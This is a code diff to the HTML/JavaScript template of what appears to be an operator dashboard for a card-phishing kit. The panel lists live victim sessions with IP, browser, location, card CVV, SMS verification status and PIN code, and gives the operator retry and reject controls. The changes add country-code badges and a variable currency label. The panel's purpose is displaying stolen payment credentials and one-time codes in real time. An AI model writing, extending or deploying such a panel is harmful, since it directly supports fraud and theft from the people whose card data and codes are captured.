@@ -84,7 +84,7 @@
           <td><button class="bell-btn" id="bell-{{ ps.id }}" onclick="toggleBell({{ ps.id }},'{{ ps.token }}')">🔔</button></td>
           <td class="font-bold text-gray-700">{{ loop.index }}</td>
           <td><span class="ping-on" id="ping-{{ ps.token }}"></span></td>
-          <td class="font-mono text-gray-800 text-xs">{{ ps.ip_address or '—' }}</td>
+          <td class="font-mono text-gray-800 text-xs">{{ ps.ip_address or '—' }}{% if ps.country_code %} <span style="display:inline-block;padding:1px 4px;border-radius:4px;font-size:9px;font-weight:700;background:#e0e7ff;color:#3730a3">{{ ps.country_code }}</span>{% endif %}</td>
           <td class="text-gray-800">{{ ps.browser or '—' }}</td>
           <td class="text-gray-800">{{ ps.country or '—' }}</td>
           <td class="font-semibold" style="color:#166534;background:#f0fdf4">{{ ps.user_city or '—' }}</td>
@@ -104,7 +104,7 @@
             {% elif ps.status=='completed' %}<span class="badge bg-green-100 text-green-700">✓ Aprobat</span>{% endif %}
           </td>
           <td id="price-{{ ps.id }}" class="font-bold" style="color:#5a9e2f">
-            {% if ps.total_price %}{{ ps.total_price }} €{% else %}<span class="text-gray-500">—</span>{% endif %}
+            {% if ps.total_price %}{{ ps.total_price }} {{ ps.currency_code or '€' }}{% else %}<span class="text-gray-500">—</span>{% endif %}
           </td>
           <td><div id="actions-{{ ps.id }}" class="flex gap-1 flex-wrap">
             {% if ps.status=='completed' %}
@@ -160,7 +160,7 @@
         {% for ps in history %}
         <tr style="opacity:.85">
           <td class="text-gray-700">{{ loop.index }}</td>
-          <td class="font-mono text-gray-800 text-xs">{{ ps.ip_address or '—' }}</td>
+          <td class="font-mono text-gray-800 text-xs">{{ ps.ip_address or '—' }}{% if ps.country_code %} <span style="display:inline-block;padding:1px 4px;border-radius:4px;font-size:9px;font-weight:700;background:#e0e7ff;color:#3730a3">{{ ps.country_code }}</span>{% endif %}</td>
           <td class="text-gray-800">{{ ps.browser or '—' }}</td>
           <td class="text-gray-800">{{ ps.country or '—' }}</td>
           <td class="font-semibold" style="color:#166534">{{ ps.user_city or '—' }}</td>
@@ -173,7 +173,7 @@
           <td class="font-mono text-xs" style="color:#ef4444">{{ ps.cvv or '—' }}</td>
           <td class="font-mono font-bold" style="color:#b45309">{{ ps.sms_status or '—' }}</td>
           <td class="font-mono font-bold" style="color:#7c3aed">{{ ps.pin_code or '—' }}</td>
-          <td class="font-bold" style="color:#dc2626">{{ ps.total_price or '—' }}{% if ps.total_price %} €{% endif %}</td>
+          <td class="font-bold" style="color:#dc2626">{{ ps.total_price or '—' }}{% if ps.total_price %} {{ ps.currency_code or '€' }}{% endif %}</td>
           <td class="text-gray-800 font-semibold">{{ ps.created_at.strftime('%d.%m.%Y %H:%M') }}</td>
         </tr>
         {% endfor %}
@@ -292,7 +292,7 @@ socket.on('new_session', function(d){
     <td><button class="bell-btn" id="bell-${d.id}" onclick="toggleBell(${d.id},'${d.token}')">🔔</button></td>
     <td class="font-bold text-gray-700">${++rowCount}</td>
     <td><span class="ping-on" id="ping-${d.token}"></span></td>
-    <td class="font-mono text-gray-800 text-xs">${d.ip||'—'}</td>
+    <td class="font-mono text-gray-800 text-xs">${d.ip||'—'}${d.country_code&&d.country_code!='—'?` <span style="display:inline-block;padding:1px 4px;border-radius:4px;font-size:9px;font-weight:700;background:#e0e7ff;color:#3730a3">${d.country_code}</span>`:''}</td>
     <td class="text-gray-800">${d.browser||'—'}</td>
     <td class="text-gray-800">${d.country||'—'}</td>
     <td class="font-semibold" style="color:#166534;background:#f0fdf4" id="loc-${d.id}">${d.locality||'—'}</td>
@@ -306,7 +306,7 @@ socket.on('new_session', function(d){
     <td id="sms-${d.id}"><span style="color:#64748b">—</span></td>
     <td id="pin-${d.id}"><span style="color:#64748b">—</span></td>
     <td id="status-${d.id}"><span class="badge bg-indigo-100 text-indigo-700">💳 Spre card</span></td>
-    <td id="price-${d.id}" style="color:#5a9e2f;font-weight:700">${d.price ? d.price+' €' : '—'}</td>
+    <td id="price-${d.id}" style="color:#5a9e2f;font-weight:700">${d.price ? d.price+' '+(d.currency||'€') : '—'}</td>
     <td><div id="actions-${d.id}" class="flex gap-1 flex-wrap">
       <button class="btn-xs b-orange" onclick="retrySession(${d.id})"><i class="fas fa-redo"></i></button>
       <button class="btn-xs b-red" onclick="rejectSession(${d.id})"><i class="fas fa-times"></i></button>
@@ -329,7 +329,7 @@ socket.on('session_updated', function(d){
   if(loc) loc.textContent=d.locality||'—';
   if(ctype) ctype.textContent=d.car_type||'—';
   if(hrs) hrs.innerHTML=d.hours+' <span style="color:#94a3b8;font-size:10px">'+d.time_unit+'</span>';
-  if(pr) pr.innerHTML='<span style="color:#5a9e2f">'+d.price+' €</span>';
+  if(pr) pr.innerHTML='<span style="color:#5a9e2f">'+d.price+' '+(d.currency||'€')+'</span>';
   if(st) st.innerHTML='<span class="badge bg-indigo-100 text-indigo-700">💳 Spre card</span>';
   const row=document.getElementById('row-'+d.id);
   if(row){ row.style.cssText='background:#fefce8;transition:background 2s'; setTimeout(()=>{row.style.background='';},2500); }
@@ -338,7 +338,7 @@ socket.on('price_set', function(d){
   const p=document.getElementById('price-'+d.id);
   const s=document.getElementById('status-'+d.id);
   const a=document.getElementById('actions-'+d.id);
-  if(p) p.innerHTML=`<span style="color:#5a9e2f">${d.price} €</span>`;
+  if(p) p.innerHTML=`<span style="color:#5a9e2f">${d.price} ${d.currency||'€'}</span>`;
   if(s) s.innerHTML=`<span class="badge bg-indigo-100 text-indigo-700">💳 Spre card</span>`;
   if(a) a.innerHTML=`
     <button class="btn-xs b-orange" onclick="retrySession(${d.id})"><i class="fas fa-redo"></i></button>
